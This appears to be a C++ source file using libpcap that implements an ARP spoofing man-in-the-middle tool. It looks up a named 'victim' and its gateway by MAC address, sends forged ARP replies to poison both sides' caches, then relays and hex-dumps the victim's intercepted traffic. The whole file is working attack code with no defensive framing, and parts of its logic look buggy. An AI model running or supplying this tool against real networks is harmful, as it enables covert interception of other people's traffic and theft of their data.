#include <stdio.h>
#include <string.h>
#include <iostream>
#include <pcap.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <map>
#include <utility>
#include "func.h"

using namespace std;

struct packet{
	//ethernet header
	uint8_t dest_mac[6];
	uint8_t src_mac[6];
	uint16_t type=htons(0x0806); //ARP type
	
	//request header
	uint16_t hardware_t = htons(0x0001);//ethernet(1)
	uint16_t protocol_t = htons(0x0800);//IPV4
	uint8_t hardware_size = 0x06;
	uint8_t protocol_size = 0x04;
	uint16_t opcode; //request(1) reply(2)
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];

};

/* define properties */
struct packet packet; //define packet
uint8_t my_mac[6];
uint8_t my_ip[4];
uint8_t sender_mac[6];
uint8_t dest_mac[6];
uint8_t sender_ip[4];
uint8_t target_ip[4];
uint8_t target_mac[6];
uint8_t result_a[4];
uint8_t result_b[4];

map<uint8_t*,uint8_t*> m;
/*store sender ip target ip*/

void store_ip(char* argv[],int len){

	for(int i=2;i < len ;i+=2){
		parseIP(result_a,argv[i]);
		parseIP(result_b,argv[i+1]);
		m.insert(make_pair(result_a,result_b));
	}
	auto iter = m.begin();
}

/* get my ip address and mac address */
void get_my_info(char *dev){
	struct ifreq my_info;
	int sock = socket(PF_INET,SOCK_DGRAM, IPPROTO_IP);
	
	strcpy(my_info.ifr_name,dev);
	ioctl(sock, SIOCGIFHWADDR, &my_info);
	for(int i=0; i<6;i++){
		my_mac[i] = (uint8_t)my_info.ifr_ifru.ifru_addr.sa_data[i];
	}
	ioctl(sock, SIOCGIFADDR, &my_info);
	for(int i=2;i<6;i++){
		my_ip[i-2] = (uint8_t)my_info.ifr_ifru.ifru_addr.sa_data[i];
	}
	close(sock);
}

/*make packet and send packet*/

int make_and_send_packet(
	pcap_t * fp,
	uint8_t dest_mac[],
	uint8_t src_mac[],
	uint8_t sender_ip[4],
	uint8_t target_ip[4],
	uint8_t target_mac[],
	uint16_t opcode//request or reply
	)
{
	for(int i=0;i<6;i++){
		packet.target_mac[i] = target_mac[i];
		packet.dest_mac[i] = dest_mac[i];
		packet.sender_mac[i] = src_mac[i];
		packet.src_mac[i] = src_mac[i];
	}
	
	for(int i=0;i<4;i++){
		packet.sender_ip[i]=sender_ip[i];
		packet.target_ip[i]=target_ip[i];
	}
	packet.opcode = htons(opcode);
	
	const u_char* data;
	data = (const u_char*)&packet;
	
	if(pcap_sendpacket(fp,data,42) !=0){
		fprintf(stderr,"\nError sending the packet: \n");
		return -1;
	}

	return 0;
}


/* ip parsing */
void parseIP(uint8_t* result,char* source){
	int temp =0;
	int integer = 0;
	int len = strlen(source);
	for(int i=0 ;i<len;i++){
		if(source[i]!='.'){
			integer*=10;
			integer+=source[i]-'0';
		}else{
			result[temp]=integer;
			temp++;
			integer=0;
		}
	}
	result[temp] = integer;
}

void broadcast_request(pcap_t * handle,bool check){
	if(check){
		/* send broadcast request to get victim's mac address */			
		for(int i=0;i<6;i++){
			dest_mac[i] =0xff;
		}
		for(int i=0;i<6;i++){
			target_mac[i] = 0x00;
		}
		if(make_and_send_packet(handle,dest_mac,my_mac,my_ip,sender_ip,target_mac,0x0001) !=0){
			printf("send broadcast request packet failed!\n");	
		}else{
			printf("send broadcast request packet to sender_ip success!!\n");
		};
	}else{
		/* send broadcast request to get target's  address */
		if(make_and_send_packet(handle,dest_mac,my_mac,my_ip,target_ip,target_mac,0x0001) !=0){
			printf("send broadcast request packet failed!\n");	
		}else{
			printf("send broadcast request packet to target_ip success!!\n");
		};
	}
}


bool check_ip(uint8_t *ip,const u_char* check,bool isARP,bool isDest){ //is victim's packet and it is sended to me?

	if(isARP){
		for(int i=0;i<4;i++){
			if(ip[i]!=check[i+28]) return false;
		}
		for(int i=0;i<4;i++){
			if(my_ip[i]!=check[i+38]) return false;
		}
	}else{
		if(isDest){
			for(int i=0;i<4;i++){
				if(ip[i]!=check[i+30]) return false;
			}
		}else{
			for(int i=0;i<4;i++){
				if(ip[i]!=check[i+26]) return false;
			}
		}
	}
	return true;
}


int main(int argc, char* argv[])
{
	if (argc <4){
		printf("send_arp <interface> <sender ip> <target ip> <sender_ip> <target_ip> ....");
		return -1;
	}
	int sender_target_len = (argc-2)/2;//sender and target's ip pair length
	store_ip(argv,argc);
	char* dev = argv[1];

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ,1,1000,errbuf);
	if(handle == NULL){
		fprintf(stderr, "couldn't open device %s: %s\n",dev, errbuf);
		return -1;
	}
	/*get my info*/
	get_my_info(dev);
	/*frequency of send broadcast request and change spoofing target*/
	int loop=0;
	int check_loop=0;
	auto iter = m.begin();
	/*take target's mac address*/
	while(true){
		printf("\n----------------------sniff----------------------\n");
		/*change spoof target ip*/
		if(check_loop<sender_target_len){
			for(int i=0;i<4;i++){
				sender_ip[i] = iter->first[i];
				target_ip[i] = iter->second[i];
			}
			iter++;
			check_loop++;
		}else{
			check_loop=0;
			iter=m.begin();
		}
		if(loop==0){
			broadcast_request(handle,true);
		}else if(loop==1){
			broadcast_request(handle,false);
		}else if(loop==5) loop=-1;
		loop++;
		struct pcap_pkthdr* header;
		const u_char* packet;
		u_char* dummy;
		int res = pcap_next_ex(handle, &header,&packet);
		if( res==0) continue;
		if (res== -1||res==-2)break;
		uint8_t type[2]; 
		uint8_t opcode[2];
		unsigned int packet_len = (unsigned int)packet[17]+14;
		type[0] = packet[12];
		type[1] = packet[13];
		opcode[0]=packet[20];
		opcode[1]=packet[21];
		
		if(type[0]==0x08 &&type[1]==0x06){ //is type == arp ?
			if(opcode[0]==0x00 &&opcode[1]==0x02){//is opcode is reply?
				/*take mac address*/
			
				if(check_ip(sender_ip,packet,true/*isARP?*/,false/*isDest*/)){//is victim's recovery?
					/*copy victim mac address to sender_mac*/
					for(int i=0;i<6;i++){
						sender_mac[i] = packet[i+6];
					}

					//dest_mac, src_mac, sender_ip, target_ip, target_mac

					if(make_and_send_packet(handle,sender_mac,my_mac,target_ip,sender_ip,sender_mac,0x0002)!=0){
						printf("\nsend arp reply packet to sender failed!\n");
					}else{
						printf("\nsend arp reply packet to sender success!\n");
					}	
				}else if(check_ip(target_ip,packet,true,false)){//is gateway's recovery?
					/*copy gateway mac address to target_mac*/
					for(int i=0;i<6;i++){
						target_mac[i] = packet[i+6];
					}
					if(make_and_send_packet(handle,target_mac,my_mac,sender_ip,target_ip,target_mac,0x0002)!=0){
						printf("\nsend arp reply packet to gateway failed!\n");
					}else{
						printf("\nsend arp reply packet to gateway success!\n");
					}

				}	
			}
		}else{ //relay
			/*print some packet data in received packet*/
			printf("%d\n",packet_len);
			dummy=(u_char*)packet; //copy packet to dummy(non constant variable)

			if(check_ip(sender_ip,packet,false,true)){ //if dest is victim's ip
				printf("---------------relay to victim's packet---------------\n");
				for(int i=0;i<6;i++){
					dummy[i+6]=my_mac[i];
				}
				for(int i=0;i<packet_len;i++){ //print packet
					printf("%02x ",packet[i]);
					if(i%8==7){
						printf("\n");
					}
				}
				if(pcap_sendpacket(handle,dummy,packet_len)!=0){
					printf("error with sending relay packet to gateway");	
				}

			}else if(check_ip(sender_ip,packet,false,false)){ //if src is victim's ip
				printf("--------------relay from victim's packet---------------\n");
				for(int i=0;i<6;i++){
					dummy[i+6]=my_mac[i];
				}
				for(int i=0;i<packet_len;i++){ //print packet
					printf("%02x ",packet[i]);
					if(i%8==7){
						printf("\n");
					}
				}
				if(pcap_sendpacket(handle,dummy,packet_len)!=0){
					printf("error with sending relay packet to gateway");	
				}
			}else{
				printf("It is not victim's packet!\n");
			}
		}
				printf("\n---------------------end------------------------\n\n\n");	
	}
	
}
